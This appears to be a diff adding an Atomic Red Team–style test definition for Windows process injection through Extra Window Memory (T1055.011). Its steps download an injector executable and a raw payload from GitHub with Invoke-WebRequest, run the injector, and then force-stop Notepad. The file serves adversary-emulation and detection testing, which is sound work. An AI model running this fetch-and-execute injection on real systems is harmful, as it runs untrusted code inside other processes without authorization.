@@ -1,0 +1,117 @@
+{
+  "id": "93ca40d2-336c-446d-bcef-87f14d438018",
+  "name": "Process Injection via Extra Window Memory (EWM) x64 executable",
+  "description": "Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "bb0348ad-a6e1-40c3-8b0a-aa18691d3e17",
+      "type": "execute-command",
+      "data": {
+        "command": "#{exe_binary}",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "32892a0e-8281-4b4b-aef4-9a5af07872e3",
+      "type": "execute-command",
+      "data": {
+        "command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f6e44de8-748a-443f-a484-7dcf63e61a1e",
+      "name": "Check dependency 1/1",
+      "description": "T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{exe_binary}) {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "453244d2-99b9-4ed2-98fb-226eb82012fb",
+      "name": "Resolve dependency 1/1",
+      "description": "T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path #{exe_binary}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_#{arch}.exe\" -OutFile \"#{exe_binary}\" -UseBasicParsing\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin\" -OutFile \"#{payload_file}\" -UseBasicParsing",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c95981df-440a-4610-8e12-4e2da6bfc77c",
+      "name": "Re-check dependency 1/1",
+      "description": "T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{exe_binary}) {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "bb0348ad-a6e1-40c3-8b0a-aa18691d3e17",
+      "p": "on-success",
+      "o": "32892a0e-8281-4b4b-aef4-9a5af07872e3"
+    },
+    {
+      "s": "bb0348ad-a6e1-40c3-8b0a-aa18691d3e17",
+      "p": "on-failure",
+      "o": "32892a0e-8281-4b4b-aef4-9a5af07872e3"
+    },
+    {
+      "s": "f6e44de8-748a-443f-a484-7dcf63e61a1e",
+      "p": "on-success",
+      "o": "bb0348ad-a6e1-40c3-8b0a-aa18691d3e17"
+    },
+    {
+      "s": "f6e44de8-748a-443f-a484-7dcf63e61a1e",
+      "p": "on-failure",
+      "o": "453244d2-99b9-4ed2-98fb-226eb82012fb"
+    },
+    {
+      "s": "453244d2-99b9-4ed2-98fb-226eb82012fb",
+      "p": "on-success",
+      "o": "c95981df-440a-4610-8e12-4e2da6bfc77c"
+    },
+    {
+      "s": "c95981df-440a-4610-8e12-4e2da6bfc77c",
+      "p": "on-failure",
+      "o": "bb0348ad-a6e1-40c3-8b0a-aa18691d3e17"
+    }
+  ],
+  "tags": [
+    "T1055.011",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "arch",
+      "type": "string",
+      "description": "Architecture of payload. One of (x64, x86)",
+      "value": "x64"
+    },
+    {
+      "name": "exe_binary",
+      "type": "path",
+      "description": "PE binary for EWM injection",
+      "value": "PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe"
+    },
+    {
+      "name": "payload_file",
+      "type": "path",
+      "description": "raw payload to inject",
+      "value": "PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin"
+    }
+  ]
+}
